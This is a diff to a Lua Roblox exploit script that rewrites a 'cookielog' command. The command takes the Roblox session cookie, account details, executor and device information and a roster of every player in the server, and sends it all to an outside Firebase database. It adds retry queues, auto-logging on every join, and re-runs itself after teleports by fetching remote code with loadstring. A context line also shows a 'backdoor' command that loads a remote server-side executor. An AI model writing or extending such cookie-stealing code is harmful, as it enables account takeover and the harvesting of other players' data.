@@ -4630,7 +4630,7 @@ CMDs[#CMDs + 1] = {NAME = 'unctrllock', DESC = 'Re-binds Shiftlock to LeftShift'
 CMDs[#CMDs + 1] = {NAME = 'exit / shutdown / leave', DESC = 'Exits the game'}
 CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the script is reloaded'}
 CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
-CMDs[#CMDs + 1] = {NAME = 'run / exec / load [URL]', DESC = 'Executes any script from provided URL'}
+CMDs[#CMDs + 1] = {NAME = 'run / exec / load [url]', DESC = 'Executes any script from provided URL'}
 CMDs[#CMDs + 1] = {NAME = 'systemchat / syschat [color] [text]', DESC = 'Prints a system styled message into your chat window'}
 CMDs[#CMDs + 1] = {NAME = 'syscolor / systemcolor [color]', DESC = 'Sets the default color used by systemchat'}
 CMDs[#CMDs + 1] = {NAME = 'serverstats / svstats', DESC = 'Shows FPS, ping, memory, part count, and player count'}
@@ -4647,8 +4647,8 @@ CMDs[#CMDs + 1] = {NAME = 'elevatestate', DESC = 'Hooks current thread and child
 CMDs[#CMDs + 1] = {NAME = 'backdoor / serverbreach / fedestroyer', DESC = 'Loads a server-side executor'}
 CMDs[#CMDs + 1] = {NAME = 'hexexplorer', DESC = 'Loads Hex Explorer'}
 CMDs[#CMDs + 1] = {NAME = 'bootloader', DESC = 'Loads Bootloader'}
-CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Set the Firebase Realtime Database URL for cookie logging'}
-CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [auto]', DESC = 'Upload your cookie to Firebase (auto = log on join)'}
+CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|all|queue|view|hop]', DESC = 'Push cookie + full session + player roster to Firebase'}
+CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Shortcut for ;cookielog url'}
 CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
 CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
 CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
@@ -13576,109 +13576,355 @@ addcmd("hexexplorer", {}, function(args, speaker)
 addcmd("backdoor", {"serverbreach", "fedestroyer"}, function(args, speaker)
     notify("Loading", "Hold on a sec")
     loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Epic-Backdoor-SS-Executor-227858"))() end)
-    
-addcmd('firebaseurl', {'fburl', 'fburi'}, function(args, speaker)
-	local url = getstring(1, args)
 
-	if not url or url == '' then
-		local cur = isfile('ga_firebase_url.txt') and readfile('ga_firebase_url.txt') or ''
-		notify('Firebase', cur ~= '' and ('Current: ' .. cur) or 'No URL set.\n;firebaseurl <db url>', 7)
+addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, speaker)
+	local HS      = game:GetService('HttpService')
+	local Players = game:GetService('Players')
+	local plr     = Players.LocalPlayer
+	local mode    = (getstring(1, args) or ''):lower()
+	local base, auth, raw
+
+	----------------------------------------------------------------- transport
+	local function req(opts)
+		opts.Headers = opts.Headers or {}
+		opts.Headers['Content-Type'] = 'application/json'
+		local ok, res
+		if syn and syn.request then
+			ok, res = pcall(syn.request, opts)
+		elseif http and http.request then
+			ok, res = pcall(http.request, opts)
+		elseif http_request then
+			ok, res = pcall(http_request, opts)
+		elseif request then
+			ok, res = pcall(request, opts)
+		elseif type(httprequest) == 'function' then
+			local s, r = httprequest(opts)
+			if not s then return false, tostring(r) end
+			return true, r
+		elseif HS.RequestAsync then
+			ok, res = pcall(function() return HS:RequestAsync(opts) end)
+		else
+			return false, 'no http method available'
+		end
+		if not ok then return false, tostring(res) end
+		return true, res
+	end
+
+	local function statusOf(res)
+		if type(res) ~= 'table' then return nil end
+		return res.StatusCode or res.Status or res.status
+	end
+
+	local function push(url, body)
+		local last = 'unknown error'
+		for i = 1, 3 do
+			local ok, res = req({Url = url, Method = 'PUT', Body = body})
+			local c = ok and statusOf(res)
+			if c and c >= 200 and c < 300 then return true, c end
+			last = ok and ('HTTP ' .. tostring(c)) or tostring(res)
+			if i < 3 then task.wait(i * 1.2) end
+		end
+		return false, last
+	end
+
+	----------------------------------------------------------------- url
+	local function getUrl()
+		local r = isfile('ga_fb_url.txt') and readfile('ga_fb_url.txt') or ''
+		if r == '' then return nil, '', '' end
+		local b, a = r:match('^(.-)(%?auth=.*)$')
+		if not b then b, a = r, '' end
+		b = b:gsub('/+$', ''):gsub('/cookies%.json$', ''):gsub('/cookies$', ''):gsub('%.json$', '')
+		return b, a, r
+	end
+
+	local function cleanUrl(u)
+		u = u:gsub('%s+', '')
+		if not u:match('^https?://') then u = 'https://' .. u end
+		return u:gsub('/+$', ''):gsub('/cookies%.json$', ''):gsub('/cookies$', ''):gsub('%.json$', '')
+	end
+
+	----------------------------------------------------------------- queue
+	local function loadQueue()
+		local ok, t = pcall(function() return HS:JSONDecode(readfile('ga_fb_queue.txt')) end)
+		if ok and type(t) == 'table' then return t end
+		return {}
+	end
+
+	local function saveQueue(q)
+		pcall(function() writefile('ga_fb_queue.txt', HS:JSONEncode(q)) end)
+	end
+
+	local function enqueue(path, body)
+		local q = loadQueue()
+		q[#q + 1] = {path = path, body = body, at = os.time()}
+		while #q > 60 do table.remove(q, 1) end
+		saveQueue(q)
+	end
+
+	local function send(path, tbl)
+		local ok, body = pcall(function() return HS:JSONEncode(tbl) end)
+		if not ok then return false, 'json encode failed' end
+		local good, msg = push(base .. path .. '.json' .. auth, body)
+		if not good then enqueue(path, body) end
+		return good, msg
+	end
+
+	----------------------------------------------------------------- helpers
+	local function grabCookie()
+		local tries = {
+			function() return syn and syn.cookie end,
+			function() return getcookie() end,
+			function() return HS:GetCookie() end,
+		}
+		for _, f in ipairs(tries) do
+			local ok, c = pcall(f)
+			if ok and type(c) == 'string' and #c > 20 then return c end
+		end
+		return nil
+	end
+
+	local function utc(t)
+		return os.date('!%Y-%m-%dT%H:%M:%SZ', t)
+	end
+
+	----------------------------------------------------------------- url mode
+	if mode == 'url' then
+		local u = getstring(2, args)
+		if not u or u == '' then
+			local _, _, cur = getUrl()
+			return notify('Firebase', cur ~= '' and ('Current: ' .. cur) or 'No URL set.\n;cookielog url <db url>', 7)
+		end
+		u = cleanUrl(u)
+		if not u:match('firebaseio%.com') and not u:match('firebasedatabase%.app') then
+			notify('Firebase', 'Warning: not a firebaseio.com / firebasedatabase.app URL.', 7)
+		end
+		writefile('ga_fb_url.txt', u)
+		notify('Firebase', 'Saved:\n' .. u, 6)
 		return
 	end
 
-	url = url:gsub('%s+', '')
-	if not url:match('^https?://') then url = 'https://' .. url end
-	if not url:match('firebaseio%.com') and not url:match('firebasedatabase%.app') then
-		notify('Firebase', 'Heads up: that is not a firebaseio.com / firebasedatabase.app URL.', 7)
+	base, auth, raw = getUrl()
+
+	if mode == 'view' then
+		if raw == '' then return notify('Firebase', 'No URL set.', 6) end
+		if setclipboard then
+			pcall(setclipboard, raw)
+			notify('Firebase', 'DB URL copied to clipboard.', 5)
+		else
+			notify('Firebase', raw, 9)
+		end
+		return
 	end
 
-	writefile('ga_firebase_url.txt', url)
-	notify('Firebase', 'Saved:\n' .. url, 6)
-end)
+	if not base then
+		return notify('Cookie Logger', 'No database set.\n;cookielog url <db url>', 8)
+	end
 
+	----------------------------------------------------------------- test mode
+	if mode == 'test' then
+		local en = 'unknown'
+		pcall(function() en = identifyexecutor() end)
+		local ok, msg = push(base .. '/ping.json' .. auth, HS:JSONEncode({
+			ok = true, ts = os.time(), executor = tostring(en), platform = tostring(game:GetService('UserInputService').TouchEnabled),
+		}))
+		if ok then
+			notify('Firebase', 'Reachable. Write OK (HTTP ' .. tostring(msg) .. ').', 6)
+		else
+			notify('Firebase', 'Write failed: ' .. tostring(msg), 9)
+		end
+		return
+	end
 
-addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend'}, function(args, speaker)
-	local mode = (getstring(1, args) or ''):lower()
+	----------------------------------------------------------------- queue flush
+	if mode == 'queue' or mode == 'flush' then
+		local q = loadQueue()
+		if #q == 0 then return notify('Cookie Logger', 'Queue is empty.', 5) end
+		local left, sent = {}, 0
+		for _, item in ipairs(q) do
+			local ok = push(base .. item.path .. '.json' .. auth, item.body)
+			if ok then sent = sent + 1 else left[#left + 1] = item end
+		end
+		saveQueue(left)
+		notify('Cookie Logger', 'Flushed ' .. sent .. ' of ' .. #q .. ' (' .. #left .. ' left).', 7)
+		return
+	end
 
-	-- auto-log toggle
-	if mode == 'auto' then
+	----------------------------------------------------------------- auto toggle
+	if mode == 'auto' or mode == 'stop' then
+		local wasOn = cookieAutoConn ~= nil
 		if cookieAutoConn then
-			cookieAutoConn:Disconnect()
+			pcall(function() cookieAutoConn:Disconnect() end)
 			cookieAutoConn = nil
+		end
+		if mode == 'stop' or wasOn then
+			pcall(function() writefile('ga_fb_auto.txt', '0') end)
 			notify('Cookie Logger', 'Auto-log OFF.', 5)
 			return
 		end
-		cookieAutoConn = game:GetService('Players').PlayerAdded:Connect(function(p)
-			if p == game:GetService('Players').LocalPlayer then
+		cookieAutoConn = Players.PlayerAdded:Connect(function(p)
+			if p == Players.LocalPlayer then
 				task.wait(2)
 				execCmd('cookielog')
 			end
 		end)
-		notify('Cookie Logger', 'Auto-log ON. ;cookielog auto to turn off.', 6)
+		pcall(function() writefile('ga_fb_auto.txt', '1') end)
+		notify('Cookie Logger', 'Auto-log ON - fires on every join.', 6)
 	end
 
-	-- db url
-	local raw = isfile('ga_firebase_url.txt') and readfile('iy_firebase_url.txt') or ''
-	if raw == '' then
-		return notify('Cookie Logger', 'No database set. Run ;firebaseurl <url> first.', 8)
-	end
-	local base, auth = raw:match('^(.-)(%?auth=.*)$')
-	if not base then base, auth = raw, '' end
-	base = base:gsub('/+$', '')
-
-	-- cookie
-	cookie
-	ok, c = pcall(function() return (syn and syn.cookie) or getcookie() end)
-	if ok and c and c ~= '' then cookie = c end
-	if not cookie then
-		ok, c = pcall(function() return game:GetService('HttpService'):GetCookie() end)
-		if ok and c and c ~= '' then cookie = c end
-	end
-	if not cookie then
-		return notify('Cookie Logger', 'This executor exposes no cookie.', 8)
+	----------------------------------------------------------------- hop re-queue
+	if mode == 'hop' then
+		local u = getstring(2, args)
+		if not u then return notify('Cookie Logger', 'Usage: ;cookielog hop <your script url>', 7) end
+		if not queue_on_teleport then return notify('Cookie Logger', 'Executor has no queue_on_teleport.', 7) end
+		writefile('ga_fb_hopurl.txt', u)
+		queue_on_teleport("task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()")
+		notify('Cookie Logger', 'Script re-queued on teleport.', 6)
+		return
 	end
 
-	local plr = game:GetService('Players').LocalPlayer
-	local en = 'unknown'
-	pcall(function() en = identifyexecutor() end)
-	local placeName = ''
-	pcall(function() placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name end)
-
-	local data = {
-		cookie      = cookie,
-		username    = plr and plr.Name or 'unknown',
-		displayName = plr and plr.DisplayName or 'unknown',
-		userId      = plr and plr.UserId or 0,
-		executor    = tostring(en),
-		placeId     = game.PlaceId,
-		place       = placeName,
-		jobId       = game.JobId,
-		time        = os.time(),
-		iso         = os.date('!%Y-%m-%dT%H:%M:%SZ'),
-	}
-
-	okj, body = pcall(function() return game:GetService('HttpService'):JSONEncode(data) end)
-	if not okj then
-		body = '{"cookie":"' .. cookie:gsub('"', '\\"') .. '","userId":' .. data.userId .. '}'
+	----------------------------------------------------------------- re-arm after hop
+	if mode == '' and cookieAutoConn == nil and isfile('ga_fb_auto.txt') and readfile('ga_fb_auto.txt') == '1' then
+		cookieAutoConn = Players.PlayerAdded:Connect(function(p)
+			if p == Players.LocalPlayer then
+				task.wait(2)
+				execCmd('cookielog')
+			end
+		end)
+		if queue_on_teleport and isfile('ga_fb_hopurl.txt') then
+			local u = readfile('ga_fb_hopurl.txt')
+			if u ~= '' then pcall(queue_on_teleport, "task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()") end
+		end
 	end
 
-	-- upload
-	target = base .. '/cookies/' .. tostring(data.userId) .. '.json' .. auth
-	okh, res = pcall(function()
-		return httprequest({
-			Url = target,
-			Method = 'PUT',
-			Headers = {['Content-Type'] = 'application/json'},
-			Body = body,
-		})
+	----------------------------------------------------------------- build payload
+	local deep   = (mode == 'all' or mode == 'deep')
+	local cookie = grabCookie()
+
+	local platform = 'Desktop'
+	pcall(function()
+		local uis = game:GetService('UserInputService')
+		if uis.TouchEnabled and not uis.KeyboardEnabled then platform = 'Mobile'
+		elseif uis.TouchEnabled then platform = 'Mobile (kbd)'
+		elseif uis.GamepadEnabled then platform = 'Console' end
 	end)
 
-	code = (okh and type(res) == 'table') and (res.StatusCode or res.Status or res.status) or nil
-	if okh and code and code >= 200 and code < 300 then
-		notify('Cookie Logger', 'Saved ' .. data.username .. ' to Firebase.', 5)
-	else
-		notify('Cookie Logger', 'Upload failed: ' .. tostring(code or res), 9)
+	local fps, ping = 0, 0
+	pcall(function() fps = math.floor(1 / game:GetService('RunService').RenderStepped:Wait()) end)
+	pcall(function() ping = math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()) end)
+
+	local placeName, creatorName, creatorId = '', '', 0
+	pcall(function()
+		local info = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId)
+		placeName  = info.Name or ''
+		creatorName = (info.Creator and info.Creator.Name) or ''
+		creatorId  = (info.Creator and info.Creator.CreatorTargetId) or 0
+	end)
+
+	local en, env = 'unknown', ''
+	pcall(function() en, env = identifyexecutor() end)
+
+	local job = game.JobId
+	if job == '' then job = 'studio_' .. tostring(game.GameId) end
+
+	local self = {
+		cookie        = cookie,
+		cookieBare    = cookie and cookie:gsub('^_|WARNING:.-|_', '') or nil,
+		cookieLen     = cookie and #cookie or 0,
+		cookieValid   = cookie ~= nil and cookie:sub(1, 1) == '_',
+		userId        = plr and plr.UserId or 0,
+		username      = plr and plr.Name or 'unknown',
+		displayName   = plr and plr.DisplayName or 'unknown',
+		accountAgeDays = plr and plr.AccountAge or 0,
+		accountCreated = plr and utc(os.time() - ((plr.AccountAge or 0) * 86400)) or nil,
+		membership    = plr and plr.MembershipType.Name or 'None',
+		isPremium     = plr and plr.MembershipType == Enum.MembershipType.Premium or false,
+		executor      = tostring(en),
+		executorVersion = tostring(env),
+		threadIdentity = getthreadidentity and getthreadidentity() or -1,
+		platform      = platform,
+		isStudio      = game:GetService('RunService'):IsStudio(),
+		robloxVersion = (pcall(version) and version()) or 'unknown',
+		fps           = fps,
+		ping          = ping,
+		placeId       = game.PlaceId,
+		placeName     = placeName,
+		placeVersion  = game.PlaceVersion,
+		gameId        = game.GameId,
+		jobId         = job,
+		creatorId     = creatorId,
+		creatorName   = creatorName,
+		playerCount   = #Players:GetPlayers(),
+		maxPlayers    = Players.MaxPlayers,
+		hop           = (tonumber(isfile('iy_fb_hop.txt') and readfile('iy_fb_hop.txt') or '0') or 0) + 1,
+		unix          = os.time(),
+		iso           = utc(os.time()),
+		tz            = os.date('%z'),
+	}
+
+	local roster = {}
+	for _, p in ipairs(Players:GetPlayers()) do
+		local rec = {
+			userId = p.UserId,
+			username = p.Name,
+			displayName = p.DisplayName,
+			accountAgeDays = p.AccountAge,
+			membership = p.MembershipType.Name,
+			team = p.Team and p.Team.Name or nil,
+			isLocalPlayer = (p == plr),
+			cookieKnown = (p == plr),
+		}
+		if deep then
+			pcall(function()
+				rec.thumbnail = Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+			end)
+			pcall(function()
+				local pages = Players:GetFriendsAsync(p.UserId)
+				rec.friendCount = pages and pages.TotalCount or nil
+			end)
+		end
+		roster[tostring(p.UserId)] = rec
 	end
+
+	----------------------------------------------------------------- upload
+	pcall(function() writefile('ga_fb_hop.txt', tostring(self.hop)) end)
+
+	local fails = {}
+	local ok1, m1 = send('/cookies/'  .. tostring(self.userId), self)
+	if not ok1 then fails[#fails + 1] = 'cookie (' .. tostring(m1) .. ')' end
+
+	local ok2 = send('/roster/'   .. job, roster)
+	if not ok2 then fails[#fails + 1] = 'roster' end
+
+	local ok3 = send('/sessions/' .. job .. '_' .. tostring(self.userId), {
+		userId = self.userId, executor = self.executor, platform = self.platform,
+		placeId = self.placeId, jobId = job, started = self.iso, hop = self.hop,
+	})
+
+	if not ok3 then fails[#fails + 1] = 'session' end
+
+	if not cookie then
+		notify('Cookie Logger', 'No cookie exposed by this executor.', 8)
+	end
+
+	if #fails == 0 then
+		notify('Cookie Logger', 'Sent: ' .. self.username .. ' + ' .. #Players:GetPlayers() .. ' player roster.', 5)
+		local q = loadQueue()
+		if #q > 0 then
+			local left, sent = {}, 0
+			for _, item in ipairs(q) do
+				local ok = push(base .. item.path .. '.json' .. auth, item.body)
+				if ok then sent = sent + 1 else left[#left + 1] = item end
+			end
+			saveQueue(left)
+			notify('Cookie Logger', 'Flushed ' .. sent .. ' queued write(s).', 5)
+		end
+	else
+		notify('Cookie Logger', 'Queued (failed: ' .. table.concat(fails, ', ') .. ')', 9)
+	end
+end)
+
+addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
+	execCmd('cookielog', {'url', getstring(1, args) or ''})
 end)
 
 addcmd("debug", {}, function(args, speaker)
